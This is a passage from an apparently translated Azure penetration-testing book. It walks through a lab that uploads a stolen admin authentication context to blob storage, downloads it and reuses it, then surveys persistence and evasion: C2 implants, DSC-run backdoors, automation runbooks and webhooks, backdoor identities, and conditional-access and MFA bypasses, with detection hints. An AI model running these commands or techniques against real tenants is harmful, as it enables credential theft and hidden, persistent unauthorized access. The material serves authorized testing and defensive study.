  \ 值。 **确保在粘贴前没有换行符。** 你应该会收到 HTTP 201 响应：\n\n```\nhttp PUT \"<blob_container_url>\"\
  \ \"@azureprofile.zip\" \"x-ms-blob-type: BlockBlob\"\n```\n\n以下是命令及其输出的屏幕截图：\n\n\
  ![](img/4fa338e84e0a590967a142dd798ba4e2_312_1.png)\n\n图 8.11 – 将提取的凭据上传到 Azure\
  \ Blob Storage\n\n前面的命令使用了 HTTPie 工具，我们在第 2 章《构建你自己的环境》中介绍了它。以下是相同命令的 PowerShell\
  \ 等效命令：\n\n```\nInvoke-WebRequest -Method 'PUT' -Uri '<blob_container_url>' -InFile\
  \ 'azureprofile.zip' -Headers @{\"x-ms-blob-type\"=\"BlockBlob\"}\n```\n\n- 11.\
  \ 通过在 Azure 门户中浏览来验证压缩的身份验证上下文现在是否存在于存储帐户中。存储帐户的命名格式为 pentestXXXX（XXXX 是由部署脚本生成的随机数字）：\n\
  \n![](img/4fa338e84e0a590967a142dd798ba4e2_313_0.png)\n\n图 8.12 – 验证外泄的凭据\n\n- 12.\
  \ 在你的 pentest VM 中，打开一个 PowerShell 控制台并使用以下命令验证你当前是否没有连接到受害者的 Azure 环境。你应该会收到错误消息，如以下屏幕截图所示。\n\
  \n如果你已通过身份验证，请使用 `Disconnect-AzAccount` 注销：\n\n```\nGet-AzResourceGroup\n```\n\n\
  以下是命令及其输出的屏幕截图：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_314_0.png)\n\n图 8.13\
  \ – 验证未经过身份验证的会话\n\n- 13. 使用以下命令下载并验证外泄的上下文文件。 将 `<blob_container_url>` 占位符替换为从脚本输出中复制的\
  \ Exfiltration Storage Location 值：\n\n```\nInvoke-WebRequest -Uri \"<blob_container_url>\"\
  \ -OutFile azureprofile.zip\n```\n\n```\nGet-ChildItem azureprofile.zip\n```\n\n\
  以下是命令及其输出的屏幕截图：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_314_1.png)\n\n图 8.14\
  \ – 下载提取的凭据\n\n- 14. 使用以下命令提取下载的文件并验证提取的文件：\n\n```\n7z e azureprofile.zip\n```\n\
  \n```\nGet-ChildItem -Filter azureprofile.*\n```\n\n以下是第一个命令及其输出的屏幕截图：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_315_0.png)\n\
  \n图 8.15 – 提取下载的压缩 ZIP\n\n以下屏幕截图是第二个命令及其输出：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_315_1.png)\n\
  \n图 8.16 – 查看提取的凭据\n\n- 15. 使用以下命令将身份验证上下文恢复到你的 pentest VM：\n\n```\nImport-AzContext\
  \ -Path ./azureprofile.json\n```\n\n以下是命令及其输出的屏幕截图：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_316_0.png)\n\
  \n图 8.17 – 将上下文导入到当前会话\n\n- 16. 通过运行使用被盗管理员身份验证上下文的命令来验证上下文是否已成功应用于你的 pentest VM。此时，你已验证身份验证上下文可以从管理员系统窃取、导出并从攻击者系统重用：\n\
  \n```\nGet-AzResourceGroup\n```\n\n以下是命令及其输出的屏幕截图。如果收到错误消息，请尝试打开一个新的 PowerShell\
  \ 窗口：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_316_1.png)\n\n图 8.18 – 使用外泄的凭据验证\
  \ Azure 访问\n\n- 17. 现在我们已完成此练习，请返回 Azure Cloud Shell 并运行以下命令以下载清理脚本并验证下载：\n\n```\n\
  Invoke-WebRequest -Uri http://bit.ly/admin-token-theft-scenario-cleanup -OutFile\
  \ admin-token-theft-scenario-windows-cleanup.ps1\n```\n\n```\nGet-ChildItem\n```\n\
  \n至此，你已成功从管理员系统外泄 Azure 凭据并将其导入到你的系统。接下来，我们将介绍在单个 Azure 服务集合中保持持久性的可用选项。这些服务可以允许在多个层面上使用远程访问，并可以提供持久的资源和租户访问。\n\
  \n如果你创建任何新的资源来实现这种持久性，你应该使用现有的标签和资源命名结构来与现有资源融合。一般来说，最好坚持使用订阅中的现有服务来融合，但根据你的选项，你可能必须创建可能超出租户正常基础设施范围的新资源。\n\
  \n#### 使用虚拟机保持持久性\n\n首先，我们将研究如何利用 **虚拟机 (VM)** 来维持对 Azure 环境的访问。由于 VM 通常加入到更大的 Active\
  \ Directory 域，因此它们可用于在 Azure 和 Active Directory 中保持持久性。\n\n作为入门，我们将介绍使用 **命令与控制\
  \ (C2)** 植入物在 Azure VM 上开始持久性的情况。有许多商业和开源工具可用（Cobalt Strike、Covenant、PowerShell\
  \ Empire 等），这些工具通常用于获取对系统的初始访问。我们可以在 Azure VM 上使用这些初始植入物可执行文件来开始在它们上的持久性工作。\n\n\
  > **重要说明**\n>\n> 请记住，许多 *现成* 的 C2 工具可能会被端点保护软件捕获。你可能需要在部署到 VM 之前采取额外的步骤来混淆你的有效负载。\n\
  \n这些植入物可以通过以下几种方式部署到 VM：\n\n- 使用 VM `Run command` 功能\n- 作为自定义脚本扩展\n- 直接通过 RDP 访问系统\n\
  - 使用 DSC 配置（我们稍后会介绍）\n\n一旦在这些系统上建立了初始部署和持久性，这些植入物将允许我们在系统上执行命令并维持对 VM 本身的访问。这使我们能够在主机上获得操作系统级别的访问，但并不保证域或\
  \ AAD 访问。\n\n由于 C2 植入物的执行很大程度上取决于 VM，因此我们在本章中不会过多关注它。然而，由于我们正在讨论不同的持久性方法，这些方法可能允许在\
  \ VM 上执行命令，因此请将其作为一个选项记住。\n\n##### 打开管理端口\n\n作为在虚拟机上使用 C2 植入物的替代方案，我们可以向我们的 IP 地址打开管理端口，以便使用我们已知的凭据远程访问\
  \ VM。正如我们之前提到的，有几种方法可以获取（或设置）VM 的本地管理员凭据，我们可以使用这些凭据远程管理系统。\n\n这不是一个理想的解决方案，因为在渗透测试期间向互联网开放端口通常是不好的做法。此外，将端口打开到特定\
  \ IP 地址会将你的 IP 地址告知事件响应团队，这将使他们很容易将归因追溯到你的系统。此方法也可以扩展到 Azure PaaS 服务（Azure SQL 数据库、密钥保管库等），但这是一种特别嘈杂的维持访问方法，因此我们建议避免使用，除非你真的需要使用它。\n\
  \n另一个不太嘈杂的选项是在网络安全组中打开端口时指定 Azure 服务标签作为源。服务标签允许我们定义不太可疑的后门。例如，修改网络安全组以允许来自 AzureCloud\
  \ 服务标签或 AzureCloud.UKSouth 服务标签的 RDP 或 SSH 流量可能对安全运营团队来说不太可疑，同时仍允许来自与指定源匹配的任何 Azure\
  \ 节点的连接。\n\n##### 添加托管标识\n\n通过向 VM 添加托管标识（系统分配或用户分配），我们可能能够为自己授予对租户中其他 Azure 资源的访问权限以实现持久性。这需要我们执行以下步骤：\n\
  \n- 1. 在 Azure 门户中导航到我们的目标 VM。\n- 2. 为 VM 分配系统分配或用户分配的托管标识。\n- 3. 在订阅/管理组和/或 Azure\
  \ AD 级别为托管标识分配额外的权限。从渗透测试的角度来看，我们需要小心不要添加使环境容易受到更广泛攻击的权限。\n\n\n\n\n这一过程将为我们留下一个托管身份，只要我们能访问虚拟机及其附加的托管身份，就可以用它来访问\
  \ Azure（以及潜在的 Azure AD）资源。如前所述，这可能是划分长期选项的好机会：使用一个托管身份进行订阅管理，使用另一个托管身份访问 Azure AD：\n\
  \n![](img/4fa338e84e0a590967a142dd798ba4e2_320_0.png)\n\n图8.21 – 关联现有的用户分配托管身份\n\
  \n此外，与使用系统分配的托管身份（事后仍需要授予权限）相比，使用具有我们想要用于持久化的权限的现有用户分配托管身份，可能是更不易引起注意的选择（见图8.21）。\n\
  \n还应注意到，当虚拟机上没有预先存在的托管身份时，这种方法效果最佳。作为测试人员，我们希望避免进行可能干扰现有身份分配的重大状态更改。使用托管身份进行持久化也可以应用于平台即服务（PaaS）服务（应用服务、AKS\
  \ 等）。\n\n#### 自动化帐户 DSC\n\n虽然这在一定程度上与下一节的内容契合，但自动化帐户服务中的所需状态配置（DSC）功能是一个我们可以用来在\
  \ Azure 虚拟机上持久化访问的功能。DSC 功能通常用于确保系统按照所需的配置进行配置，如果该配置发生变化，DSC 将调整配置使其达到所需状态。\n\n\
  通过为虚拟机提供“运行我的恶意可执行文件”的“所需状态”，我们可以确保我们希望在虚拟机上运行的代码被持续运行。\n\n> **重要说明**\n>\n> 与本节所述技术非常相似的一种技术（使用\
  \ VM DSC 扩展与自动化帐户 DSC 对比）已在 NetSPI 博客上由 Jake Karnes 撰写的帖子中更详细地介绍：https://www.netspi.com/blog/technical/cloud-penetration-testing/azure-persistence-with-desired-state-configurations/。\n\
  \n例如，我们可以使用以下过程将虚拟机连接到 DSC 服务并设置*所需状态*，该状态会在虚拟机上运行脚本：\n\n1. 将目标 VM 作为 DSC 节点添加到自动化帐户服务。\n\
  2. 上传配置。\n3. 编译配置。\n4. 将节点配置分配给 VM。\n5. 等待 DSC 指示节点不符合要求并运行*修正*脚本。\n\n对于配置，我们有几种*所需状态*选项。从持久化的角度来看，我们希望拥有允许远程访问的配置。以下通用配置可用于确保我们的后门持续运行：\n\
  \n- 文件（`testfile.exe`）应存在于 C 盘的 `C:\\testfile.exe` 路径。\n- 系统中应有一个从特定路径（`C:\\testfile.exe`）运行的进程。\n\
  - 如果任一条件不满足，则纠正该条件。\n\n请记住，DSC 可能有点难以配置，但它们在 Azure 界面中隐藏得很好，因此这将有助于隐藏执行过程，并有望为你提供一种不错的持久化方法。\n\
  \n> **重要说明**\n> 虽然这种替代方案可能是一种明显的持久化方法，但你可以创建一台 VM 来利用前述任何选项以维持访问。在使用了大量 VM 的环境中，这种技术可能不那么显眼，但在启用了基本监控和警报的环境中，VM\
  \ 的创建通常会受到监控。\n\n在本节中，我们已经了解了在 Azure 虚拟机上维持持久化的多种方式。在下一节中，我们将了解如何使用自动化帐户在 Azure\
  \ 环境中维持持久化。\n\n#### 使用自动化帐户维持持久化\n\n顾名思义，自动化帐户可用于自动化 Azure 中的任务。我们已在其他章节中介绍过它们，但这里将再次简要提及，以展示如何将它们用于持久化。\n\
  \n自动化运行方式帐户是弥合 Azure AD（AAD）与订阅级别之间差距的好方法。这些帐户可以在 AAD 和订阅级别分配权限，因此它们可用于多种不同的持久化选项。\n\
  \n由于运行方式帐户可以被分配订阅级角色（所有者、参与者等），我们可以将 runbook 与这些帐户结合使用来访问订阅资源。最好的例子是使用 runbook 在环境中的\
  \ VM 上执行命令。假设我们的测试目标是在测试窗口期内保持对 Azure VM 的访问。通过设置一个具有计划作业的 runbook，该作业可以同时在所有 VM\
  \ 上运行命令，我们就能轻松地持久化这种访问。\n\n除了能够将订阅级角色分配给运行方式帐户外，我们还可以将 Azure AD 角色分配给自动化帐户的运行方式帐户。这使我们能够设置\
  \ runbook，添加或修改 Azure AD 用户和角色，以帮助我们维持访问。\n\n> **重要说明**\n> 有关自动化帐户可用于持久化的方式的更多信息，请查看\
  \ NetSPI 博客上的这篇文章，其中介绍了一种可能的选项：https://www.netspi.com/blog/technical/cloud-penetration-testing/maintaining-azure-persistence-via-automation-accounts/。\n\
  \n下面是一个示例，展示了我们可以使用具有特权 AAD 角色的运行方式帐户做什么：\n\n1. 为运行方式帐户分配特权 AAD 角色（全局管理员、用户管理员等）。\n\
  2. 创建一个 runbook，向 AAD 租户添加新用户（使用已知密码）。\n3. 在 AAD 中为新用户分配特权角色。\n4. 使用该新用户作为访问 AAD\
  \ 的短期通道。\n\n最后，我们有多种选项来执行这些 runbook 以维持我们的访问。我们之前介绍了使用计划方法，但还有另一种方法可用于启动 runbook。webhook\
  \ 方法可能是触发你的持久化 runbook 的好方法，即使你已经失去了对环境的访问权限：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_323_0.png)\n\
  \n图8.22 – 为自动化帐户创建新的 webhook\n\nWebhook 是可用于远程触发自动化帐户 runbook 的 URL。Webhook 的真正好处是能够按需执行它们。虽然计划\
  \ runbook 执行很有用，但它确实需要你等待预定时间才能再次运行作业。这会导致 runbook 多次执行，这可能会使持久化方法更受关注。通过使用 webhook，你可以控制\
  \ runbook 的运行时间，并限制其执行次数。\n\n虽然自动化帐户在技术上是 PaaS 服务，但它们对持久化非常有用，因此我们将它们单独划分为一个小节。接下来，我们将介绍可用于在\
  \ Azure 环境中进行持久化的其他 PaaS 服务。\n\n#### 对 PaaS 服务维持持久化\n\nAzure 中的大多数平台服务需要网络和用户授权才能访问（图8.23）。要使持久化有效，必须分为两个层面——网络持久化和用户持久化：\n\
  \n![](img/4fa338e84e0a590967a142dd798ba4e2_324_0.png)\n\n图8.23 – PaaS 网络和用户访问\n\n\
  平台服务持久化最常见的目标是数据存储或机密存储，例如平台 SQL 数据库、存储帐户、Azure Cosmos DB、容器注册表和密钥保管库。\n\n#####\
  \ 维持对平台服务的网络持久化\n\n根据资源配置的不同，网络访问可以通过公共端点或专用端点进行（图8.24）。公共端点意味着可以从公共互联网访问该资源，而专用端点意味着可以从\
  \ Azure 中的专用虚拟网络访问该资源。\n\n通过公共端点进行持久化涉及修改已配置的授权 IP 范围，使其包含一个 IP 地址。这可以使用任何 Azure\
  \ 管理工具或使用攻击性工具（如 Lava）来完成。例如，Lava 中的 sql_backdoor_firewall_rule 模块会修改平台 SQL Server\
  \ 的授权 IP 范围，使其包含指定的 IP（图8.24）。可以想象，这种修改很容易引起安全运营团队的怀疑：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_325_0.png)\n\
  \n图8.24 – 修改平台服务的授权 IP 范围\n\n对于 Azure SQL 等服务，更巧妙的方法可能是修改防火墙例外网络设置，以允许访问 Azure 服务和资源（图8.25）。此设置允许访问任何\
  \ Azure IP 地址，包括属于其他组织的公共 IP 地址！请注意，此行为主要适用于 Azure SQL，不适用于其他具有网络限制的服务，例如存储帐户、密钥保管库或容器注册表。我们建议谨慎使用此方法：\n\
  \n![](img/4fa338e84e0a590967a142dd798ba4e2_325_1.png)\n\n图8.25 – 修改 Azure SQL 防火墙例外\n\
  \n\n\n\n\n在私有终结点场景中进行网络持久化涉及在连接的虚拟网络中的虚拟机上打开后门。你可以使用本章 *Maintaining persistence\
  \ with virtual machines* 部分中强调的任何选项来实现此操作。\n\n#### 维持对平台服务的用户持久化\n\n根据资源配置，用户访问可能使用\
  \ **基于密钥的访问**，例如访问密钥、**共享访问签名 (SAS)** 令牌，或 **基于身份的访问**，通常使用 Azure AD。我们在 *Chapter\
  \ 6, Exploiting Contributor Permissions on PaaS Services* 中学习了如何使用 MicroBurst 收获密码和访问密钥。大多数平台服务访问密钥如果被泄露可以很容易地重新生成。\n\
  \n对于 Azure Storage 等服务，可以为持久化生成授予对存储资源特权访问的 SAS 令牌。使用此选项对于安全运营团队来说可能更难检测，因为该操作不会明确记录在\
  \ Activity Log 中。\n\n要使用基于身份的授权进行持久化，可以修改 RBAC 角色分配以添加对后门用户的访问。我们将在下一节讨论在 Azure\
  \ AD 中持久化的选项。\n\n#### 在 Azure AD 租户中持久化\n\n作为任何 Azure 环境的核心，Azure AD 租户是持久化的绝佳目标。一旦我们在租户内提升了权限，我们就有几个选项可以创建（或修改现有）安全主体，以便在环境中持久化。一般来说，在\
  \ Azure AD 租户中创建新主体可能会比修改现有资源产生更多警报，但具体情况可能有所不同。\n\n作为持久化的一般路径，我们需要获得对一个身份的访问，确保该身份具有必要的权限，并且（如果需要）创建策略例外以允许对该身份的持续访问。\n\
  \n#### 创建后门身份\n\n虽然我们已经涵盖了几种获得现有账户访问权限的方法（托管身份、明文凭据等），但我们尚未介绍如何在 Azure AD 中创建新身份。回顾第\
  \ 1 章，Azure Platform and Architecture Overview，我们知道身份可以是以下之一：\n\n- Azure AD 用户\n\
  - Azure AD 访客用户\n- 托管身份\n- 服务主体\n\n由于任何这些身份类型都可以在 Azure AD 租户级别分配角色，因此我们将重点关注如何创建这些身份。\n\
  \n##### 创建新的用户身份\n\n获得 Azure AD 租户后门身份的主要方法是创建新的用户身份。为了避免被检测，我们希望使用与组织现有命名策略一致的属性。为此，需要以下表中突出显示的权限，并且\
  \ Azure AD 角色列中列出的内置角色具有此权限。截至撰写本文时，自定义角色不能用于向 Azure AD 中的用户对象分配权限：\n\n| 方法 | 所需权限\
  \ | Azure AD 角色 |\n|---|---|---|\n| 创建新的用户身份 | microsoft.directory/users/create\
  \ | - 用户管理员<br>- 全局管理员<br>- 目录编写者 |\n\nTable 8.1 – Roles for creating a new user\
  \ identity\n\n创建账户时，如果租户配置了多个域名，我们可以指定将使用的域名。本书的作者之一曾遇到 Okta 被设置为主要域的身份提供者 (IdP)\
  \ 的情况。在那种情况下，使用非主要域（clientname.onmicrosoft.com）创建用户账户会绕过主要 IdP 以及在那里设置的多因素身份验证要求。此用户账户与其他正常账户有所不同，但它是租户中的有效账户。\n\
  \n你可以通过转到 **Azure portal → Azure AD → Custom domain names** 来验证租户域和当前配置的主要域：\n\n\
  ![](img/4fa338e84e0a590967a142dd798ba4e2_328_0.png)\n\nFigure 8.26 – Verifying tenant\
  \ domain names\n\n要创建新的用户账户，我们需要导航到门户中 AAD 刀片的 **Users** 部分并选择 **New user** 选项。创建用户账户时，还需要指定密码。此用户名和密码组合随后可用于向\
  \ Azure AD 进行身份验证（它仍需要被授予对角色/资源的访问权限，但我们将在本节后面介绍）。\n\n为了避免被检测，你可以查看审计日志，看看你使用的身份是否通常用于创建\
  \ Azure AD 用户账户。身份安全工具，例如身份保护，已知使用预训练的机器学习算法来学习正常用户行为并提醒你异常情况。\n\n你还可以查看 Azure AD\
  \ 密码保护设置中的组织禁止密码列表，以避免引发可能引起怀疑的警报（**Azure portal → Azure AD → Security → Authentication\
  \ methods → Password protection**）。\n\n为了识别此事件，安全运营团队可以在 Azure AD 审计日志中查找 Add user\
  \ 活动类型或操作（**Azure portal → Azure AD → Audit Logs**）。\n\n##### 使用密码创建服务主体\n\n获得 Azure\
  \ AD 租户后门身份的另一种方法是创建服务主体。默认情况下，所有非访客用户都可以创建服务主体！这是可以在 **Azure portal → Azure AD\
  \ → User settings → App registrations** 中修改的默认设置：\n\n##### chariscloud20 | User\
  \ settings\n\nAzure Active Directory\n\n- Mobility (MDM and MAM)\n- Password reset\n\
  - Company branding\n- User settings\n- Properties\n- Security\n- Monitoring\n\n\
  ![](img/4fa338e84e0a590967a142dd798ba4e2_329_0.png)\n\nFigure 8.27 – Verifying the\
  \ app registration settings\n\n如果前述选项在租户中已被禁用，则需要以下表中突出显示的权限。Azure AD 角色列中列出的内置角色具有此权限：\n\
  \n| 方法 | 所需权限 | Azure AD 角色 |\n|---|---|---|\n| 创建新的应用程序注册 | microsoft.directory/servicePrincipals/create\
  \ | - 应用程序管理员<br>- 应用程序开发人员<br>- 云应用程序管理员<br>- 自定义角色目前不能使用 |\n\nTable 8.2 – Roles\
  \ for creating a new app registration\n\n使用服务主体是绕过许多安全控制（如 MFA、条件访问和特权身份管理设置）的绝佳方式。这是因为服务主体发出的调用不会被条件访问阻止，并且特权身份管理\
  \ (PIM) 不支持服务主体。\n\n为了识别此事件，安全运营团队可以在 Azure AD 审计日志中查找 `Add application` 或 `Add\
  \ service principal` 活动类型或操作（**Azure portal → Azure AD → Audit Logs**）。\n\n#####\
  \ 将访客用户身份邀请到租户中\n\n获得 Azure AD 租户后门身份的另一种方法是邀请访客用户账户。如果协作限制设置设置为最严格的选项，如以下屏幕截图所示，则会更棘手。此设置可以在\
  \ **Azure portal → Azure AD → User settings → Manage external collaboration settings\
  \ → Collaboration restrictions:** 中找到\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_330_0.png)\n\
  \nFigure 8.28 – Verifying the external collaboration settings\n\n如果是这种情况，尝试修改此选项以添加另一个域很可能会触发警报，因为配置此选项的组织最有可能监控对列表的修改。协作限制修改事件在\
  \ Azure AD 审计日志中记录为 `Add policy` 操作。\n\n如果设置已配置为最宽松的选项，我们可以将来自通用域（如 `outlook.com`\
  \ 和 `gmail.com`）的用户邀请到租户中。默认情况下，任何用户或访客用户都可用于邀请外部身份到租户中（*Figure 8.29*）！\n\n此设置可以在\
  \ **Azure portal → Azure AD → User settings → Manage external collaboration settings\
  \ → Guest invite settings:** 中找到\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_330_1.png)\n\
  \nFigure 8.29 – Verifying the guest invitation settings\n\n\n\n\n\n需要注意的是，遵循良好安全实践的组织可能会对所有访客身份应用一个整体的条件访问策略（图\
  \ 8.30），以阻止它们访问敏感应用程序。如果是这种情况，只要我们拥有足够的权限来修改条件访问策略，我们就可以考虑绕过此限制的方法。我们将在本章后面介绍此内容：\n\
  \n![](img/4fa338e84e0a590967a142dd798ba4e2_331_0.png)\n\n图 8.30 – 外部用户的条件访问策略\n\n\
  由于许多组织可能会更密切地关注其租户中的外部身份，因此此选项很容易引起怀疑。为了识别此事件，安全运营团队可以在 Azure AD 审计日志中查找“邀请外部用户”活动类型或操作（Azure\
  \ 门户 → Azure AD → 审计日志）。\n\n#### 修改现有身份\n\n作为获取后门身份的替代方案，我们将查看如何修改将保留在账户中的现有 Azure\
  \ AD 身份。由于为现有活跃账户更改密码是一个相当明显的更改，因此我们将首先更改已禁用用户账户的凭据。\n\n如果您需要临时访问特权账户以实现持久化目标，请记住，您需要一个特权角色才能重置目标账户的凭据。例如，您可能希望使用长期持久化账户来重置特权用户的密码，以便在租户中进行短期持久化活动。此路径可能允许临时访问其他账户的资源，但对于防御者来说，追踪发起密码重置的账户应该相当容易。\n\
  \n> **重要说明**\n> 这里列出的角色描述来自以下 Microsoft 文档页面：https://docs.microsoft.com/en-us/azure/active-directory/roles/permissions-reference#password-reset-permissions。该页面有一个非常方便的表格，概述了哪些角色有权在\
  \ Azure AD 租户中重置其他角色的密码。\n\n#### 向现有服务主体添加密钥\n\n在 Azure AD 租户中建立后门身份的另一种不太可疑的方法是向现有服务主体添加密码。这是在第\
  \ 4 章《利用 Reader 权限》中使用 PowerZure 练习过的方法之一。要执行此操作，需要拥有该服务主体的账户，或具有以下表格中突出显示的权限的账户。Azure\
  \ AD 角色列中列出的内置角色具有此权限：\n\n| 方法 | 所需权限 | Azure AD 角色 |\n|---|---|---|\n| 向现有服务主体添加密钥\
  \ | microsoft.directory/servicePrincipals/credentials/update | - 应用程序管理员\n- 混合身份管理员\n\
  - 全局管理员\n- 自定义角色目前无法使用 |\n\n表 8.4 – 用于向服务主体添加密钥的角色\n\n现在我们已经确定了如何访问用于持久化的身份，让我们看看如何为这些身份分配特权角色。\n\
  \n#### 为身份授予特权访问权限\n\n有了持久化身份的访问权限后，我们将希望为该身份分配角色和特权，以便我们可以使用该身份在租户中操作。首先，我们将看看如何使用现有组来分配特权。\n\
  \n##### 将身份添加到已有的特权组\n\n授予持久特权访问权限的一种直接方法是向特权组添加后门身份。如果特权组具有*已分配的成员类型*，我们可以直接添加该身份。默认情况下，组所有者可以修改组的成员资格。具有以下表格中突出显示的权限的账户可用于修改\
  \ Azure AD 中组的成员资格或所有权：\n\n| 方法 | 所需权限 | Azure AD 角色 |\n|---|---|---|\n| 更新安全组和\
  \ Microsoft 365 组的成员资格。这不包括可分配给 Azure AD 角色的组。 | `microsoft.directory/groups/members/update`\
  \ | - 目录编写者\n- 组管理员\n- 身份治理管理员\n- 用户管理员\n- 全局管理员\n- 自定义角色目前无法使用 |\n| 更新 Azure AD\
  \ 中安全组的成员资格。这不包括可分配给 Azure AD 角色的组。 | `microsoft.directory/groups.security/members/update`\
  \ | - Intune 管理员\n- 知识管理员\n- 知识管理员\n- 自定义角色也可以分配此权限 |\n| 更新 Azure AD 中 Microsoft\
  \ 365 组的成员资格。这不包括可分配给 Azure AD 角色的组。 | `microsoft.directory/groups.unified/members/update`\
  \ | - Exchange 管理员\n- SharePoint 管理员\n- Teams 管理员\n- 自定义角色也可以分配此权限 |\n\n| 方法 | 所需权限\
  \ | Azure AD 角色 |\n|---|---|---|\n| 更新可分配给 Azure AD 角色的组的所有权和成员资格。 | `microsoft.directory/groupsAssign\
  \ ableToRoles/allProperties/update` | • 特权角色管理员<br>• 全局管理员<br>• 自定义角色目前无法使用 |\n\
  | 更新安全组和 Microsoft 365 组的所有权。这不包括可分配给 Azure AD 角色的组。 | `microsoft.directory/groups/owners/update`\
  \ | • 目录编写者<br>• 组管理员<br>• 用户管理员<br>• 全局管理员<br>• 自定义角色目前无法使用 |\n| 更新 Azure AD 中安全组的所有权。这不包括可分配给\
  \ Azure AD 角色的组。 | `microsoft.directory/groups.security/owners/update` | • Intune\
  \ 管理员<br>• 知识管理员<br>• 知识管理员<br>• 自定义角色也可以分配此权限 |\n| 更新 Azure AD 中 Microsoft 365\
  \ 组的所有权。这不包括可分配给 Azure AD 角色的组。 | `microsoft.directory/groups.unified/owners/update`\
  \ | • Exchange 管理员<br>• SharePoint 管理员<br>• Teams 管理员<br>• 自定义角色也可以分配此权限 |\n\n表\
  \ 8.5 – 用于修改组成员资格或所有权的角色\n\n如果特权组具有*动态用户成员类型*，我们可以修改动态成员规则，使其包含将我们的后门身份添加进去的表达式。我们在构建此表达式时可以发挥创意，并使用一个吸引较少怀疑的属性和值。组所有者无法修改动态成员规则。只有具有以下权限的用户才能修改这些规则：\n\
  \n| 方法 | 所需权限 | Azure AD 角色 |\n|---|---|---|\n| 更新安全组和 Microsoft 365 组的动态成员规则。这不包括可分配给\
  \ Azure AD 角色的组。 | `microsoft.directory/groups/dynamicMembershipRule/update` | -\
  \ 目录编写者\n- 组管理员\n- 用户管理员\n- 全局管理员\n- 自定义角色也可以分配此权限 |\n| 更新安全组的动态成员规则。这不包括可分配给 Azure\
  \ AD 角色的组。 | `microsoft.directory/groups.security/dynamicMembershipRule/update`\
  \ | - Intune 管理员\n- 自定义角色也可以分配此权限 |\n| 更新 Microsoft 365 组的动态成员规则。这不包括可分配给 Azure\
  \ AD 角色的组。 | `microsoft.directory/groups.unified/dynamicMembershipRule/update` |\
  \ - 自定义角色也可以分配此权限 |\n\n表 8.6 – 用于修改动态成员规则的角色\n\n接下来，我们将回顾如何直接向安全主体添加角色，而不是使用现有组。\n\
  \n##### 将身份分配给特权角色\n\n对于 Azure AD，角色分配可以直接添加或通过 PIM 进行。无论您使用哪种选项，您都需要 `microsoft.directory/roleAssignments/allProperties/allTasks`\
  \ 权限。\n\n\n\n\n在撰写本文时，只有**特权角色管理员**角色和**全局管理员**角色拥有此权限。如果正在使用 PIM，我们将必须为后门身份创建*活跃*分配，而不是需要激活的*合格*分配。\n\
  \n对于 Azure 资源，可以使用 PIM 或 Azure Blueprint 直接添加角色分配。对于直接角色分配，可以使用以下 Azure 资源角色：**所有者**、**用户访问管理员**、**共同管理员（经典）**和**服务管理员（经典）**。\n\
  \n如果正在使用 PIM，则可以使用**特权角色管理员**角色或**全局管理员**角色。\n\n使用 Blueprint 需要能够创建蓝图定义、发布定义，然后分配它。**所有者**角色拥有此操作所需的全部权限。也可以使用**蓝图参与者**角色和**蓝图操作员**角色的组合。\n\
  \n虽然经验丰富的应急响应人员应该能够快速找到你的持久化账户，但你可以通过在不同身份之间分散角色，在环境中隐藏更长时间。\n\n#### 绕过安全策略以允许访问\n\
  \n尽管我们为访问特权身份付出了所有努力，但如果我们无法访问该身份，这一切都将毫无价值。如果我们不采取适当的步骤，配置了强条件访问策略的 Azure AD 租户将阻止我们访问持久化所需的身份。\n\
  \n以下是我们为确保能持续访问这些账户而可以采取的一些额外措施：\n\n- 通过添加仅适用于后门身份的访问规则来创建条件访问漏洞。\n- 在条件访问中将我们的\
  \ IP 添加为受信任位置。\n- 将我们的 IP 添加到 MFA 受信任 IP 列表中。\n- 利用订阅级持久化技术与现有的 AAD 限制配合使用。\n\n\
  这些设置中的每一项都可以在 Azure 门户的 Azure AD 租户部分下，或在你希望持久化的受影响资源下进行配置。与 Azure 环境中的任何其他持久化活动一样，这些更改在某些环境中可能非常明显，因此你的使用方式可能有所不同。\n\
